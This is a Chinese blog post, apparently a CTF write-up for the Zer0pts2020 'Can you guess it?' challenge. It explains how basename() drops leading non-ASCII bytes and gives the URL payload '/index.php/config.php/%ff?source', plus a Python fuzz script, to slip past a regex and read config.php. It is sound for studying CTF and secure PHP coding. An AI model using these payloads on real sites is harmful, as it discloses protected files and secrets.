---

title: 日常练习34——关于$ _SERVER['PH _SELF'])和basename函数

date: 2021-05-14 23:02:02

tags: 练习

categories: test84

---
这道题是一个关于一个php函数和新的变量属性的新知识点，积累一下。  

# [Zer0pts2020]Can you guess it?

打开题目，发现让我们猜东西，猜到才能给flag，并且提供了源码。我们先审计源码：  

	<?php
	include 'config.php'; // FLAG is defined in config.php
	
	if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
	  exit("I don't know what you are thinking, but I won't let you read it :)");
	}
	
	if (isset($_GET['source'])) {
	  highlight_file(basename($_SERVER['PHP_SELF']));
	  exit();
	}
	
	$secret = bin2hex(random_bytes(64));
	if (isset($_POST['guess'])) {
	  $guess = (string) $_POST['guess'];
	  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
	} else {
    $message = 'Wrong.';
	  }
	}  

可以看到让我猜东西的代码如下：  

	$secret = bin2hex(random_bytes(64));
	if (isset($_POST['guess'])) {
	  $guess = (string) $_POST['guess'];
	  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
	} else {
    $message = 'Wrong.';
	  }
	}  

这里random_bytes( int $length)函数是生成指定大小的随机字符串（单位：字节），然后bin2hex()函数将生成的ASCII字符串转换为16进制，它让我们猜的就是这一串十六进制字符。且对比时采用了php 可防止时序攻击的字符串比较函数 hash _equals()。也就是说明，我们不可能在猜字符串这里下手脚了，猜是猜不到的。  

那么我们就重点放在前面的代码：  

	include 'config.php'; // FLAG is defined in config.php
	
	if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
	  exit("I don't know what you are thinking, but I won't let you read it :)");
	}
	
	if (isset($_GET['source'])) {
	  highlight_file(basename($_SERVER['PHP_SELF']));
	  exit();
	}  

这段代码中有两个之前没见过的重要信息：  

第一个是属性$ _SERVER['PHP _SELF']，这个表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关，如下图的测试：  

[![](https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png)](https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png)  

第二个就是basename()函数，这个函数会返回路径中的文件名部分假如路径是/index.php/config.php，浏览器的解析结果都是index.php，而basename会返回config.php，就算后面跟上多余的字符也会返回文件名部分，比如test.php/?source仍会返回文件名test.php。  

而basename()函数存在一个问题，那就是他会去掉文件名开头的非ASCII值，比如下面两个例子：  

	var_dump(basename("xffconfig.php")); // => config.php
	var_dump(basename("config.php/xff")); // => config.php

在代码的一开头就已经告诉我们了flag在config.php里，如果我们想要读取到这个文件，就要get上传参数source，并且我们的路径里的文件名必须是config.php。

	if (isset($_GET['source'])) {
	  highlight_file(basename($_SERVER['PHP_SELF']));
	  exit();
	}  

但是一开始就有一个正则匹配：  

	if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
	  exit("I don't know what you are thinking, but I won't let you read it :)");
	}

我们观察这个匹配，/config\.php\/*$/i表示匹配的是字符串尾部，对config.php这个字符进行匹配，匹配的字符串是文件路径，那也就是说，我们不能直接上传payload的文件路径为：
	
	/index.php/config.php/?source  

因为这样会被直接过滤，那么我们可以利用basename()函数会去掉文件名开头的非ASCII值这一漏洞，这样构造：  

	/index.php/config.php/%ff?source  

这里的%ff就是非ASCII值，这样构造的payload既满足了有变量source上传，能够执行读取文件的代码，又能成功返回正确的文件名config.php(因为%ff会被去掉，?source不会影响返回文件名)，最重要的是绕过了正则匹配，因为它会匹配的是**%ff?source**这一段，从而绕过了对config.php的匹配。  

[![](https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png)](https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png)  

得到config.php的内容。  

下面附上关于fuzz脚本，用来测试那些字符不会被过滤，同时构造满足条件的payload：  

	import requests
	import re
	
	for i in range(0,255):
    url ='http://cc5b962c-30fd-4564-a182-23f81878af5a.node3.buuoj.cn/index.php/config.php/{}?source'.format(chr(i))
    print(url)
    r = requests.get(url)
    flag = re.findall("flag\{.*?\}", r.text)
    if flag:
        print(flag)
        break
  
# 小结  

这道题就是两个关于php的新知识，比较重要的就是basename()函数的一些问题，当作积累就好了。  

附上basename()函数的漏洞官网：  

[basename()函数](https://bugs.php.net/bug.php?id=62119)